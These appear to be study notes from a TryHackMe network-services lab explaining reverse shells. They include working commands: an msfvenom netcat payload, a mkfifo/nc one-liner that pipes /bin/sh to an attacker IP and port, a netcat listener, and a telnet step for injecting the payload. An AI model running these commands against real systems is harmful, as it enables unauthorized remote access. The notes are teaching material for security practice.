# Reverse Shell

## Shell
A **shell** can simply be described as a piece of code or program which can be used to gain code or command execution a a device.

A **reverse shell** is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listening port, on which it receives connection, resulting in code or command execution being achieved.

## Example of Reverse Shell
1. Create a pipe which is the ouput as a paylod from `msfvenom` program
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.21.199.67 lport=4444 R
```
Where, `lhost` is local host IP address and `lport` is the port number.
The program will generate payload like below:
```bash
mkfifo /tmp/gcsu; nc 10.21.199.67 4444 0</tmp/gcsu | /bin/sh >/tmp/gcsu 2>&1; rm /tmp/gcsu
```
2. Now create a listener in the Local computer and use the port number which was used to make the `payload`
```bash
nc -lvnp 4444
```
3. Connect to the target using `telnet` program
```bash
telnet 10.10.39.115 8012
```
4. Paste the whole payload generated by the `msfvenom` 
```bash
.RUN 

mkfifo /tmp/gcsu; nc 10.21.199.67 4444 0</tmp/gcsu | /bin/sh >/tmp/gcsu 2>&1; rm /tmp/gcsu
```
5. Now the nc (or netcat) program will connected to the target and allow us to interact with the target machine

> Source: https://tryhackme.com/room/networkservices
